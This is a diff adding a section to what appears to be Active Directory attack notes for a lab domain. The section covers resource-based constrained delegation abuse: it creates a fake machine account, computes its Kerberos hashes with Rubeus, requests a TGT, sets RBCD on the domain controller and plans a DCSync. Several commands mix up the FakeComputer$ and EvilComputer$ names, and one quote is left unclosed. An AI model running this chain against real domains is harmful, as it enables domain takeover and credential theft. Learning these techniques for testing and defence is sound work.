@@ -251,4 +251,34 @@ Access the dc via psexec
 C:\Users\Alex\Desktop> psexec.exe \\dc.dev.dhitalcorp.local cmd
 ```
 ## Creating own computer account to exploit RBCD
-If we donot have local administrator on a computer we can simple create our own computer account. Regular domain users can create upto 10 machine accounts in the domain using [Stand]
+If we donot have local administrator on a computer we can simple create our own computer account. Regular domain users can create upto 10 machine accounts in the domain using [StandIn](https://github.com/FuzzySecurity/StandIn). It will create a computer named FakeComputer and give us the computer password.
+```powershell
+C:\Users\Alex> StandIn.exe --computer FakeComputer --make
+```
+We can calculate the hashes of the given password using Rubeus.
+```powershell
+C:\Users\Alex> Rubeus.exe hash /password:kJrpHpBtF1YCXax /user:FakeComputer$ /domain:dev.dhitalcorp.local
+
+Rubeus.exe hash /password:kJrpHpBtF1YCXax /user:EvilComputer$ /domain:dev.dhitalcorp.local
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : kJrpHpBtF1YCXax
+[*] Input username             : FakeComputer$
+[*] Input domain               : dev.dhitalcorp.local
+[*] Salt                       : DEV.DHITALCORP.LOCALhostfakecomputer.dev.dhitalcorp.local
+[*]       rc4_hmac             : 30FC7B684382D5F15B82DFB709CAB602
+[*]       aes128_cts_hmac_sha1 : 3524D600E1AA49DD98CD03FEABC3BC8A
+[*]       aes256_cts_hmac_sha1 : C79B43CADBE0F8DA09C67D5F61316BAD84A03789E5B9B9EDE64CDDD98DC20112
+[*]       des_cbc_md5          : 0740D61C01586B2A
+```
+Here, using aes256 key we need to first do over pass the hash to request TGT for FakeComputer$
+
+```powershell
+C:\Users\Alex\Desktop> .\Rubeus.exe asktgt /user:EvilComputer$ /aes256:C79B43CADBE0F8DA09C67D5F61316BAD84A03789E5B9B9EDE64CDDD98DC20112 /nowrap
+```
+Set RBCD on dc.
+```Powershell
+C:\Users\Alex\Desktop> Set-DomainRBCD -Identity dc -DelegateFrom 'FakeComputer$
+```
+Using the above TGT we can now request `S4U2Self` ticket for itself(FakeComputer$) then `S4U2Proxy` ticket for ldap on dc$ on behalf of alex(domain admin) to perform dcsync. 
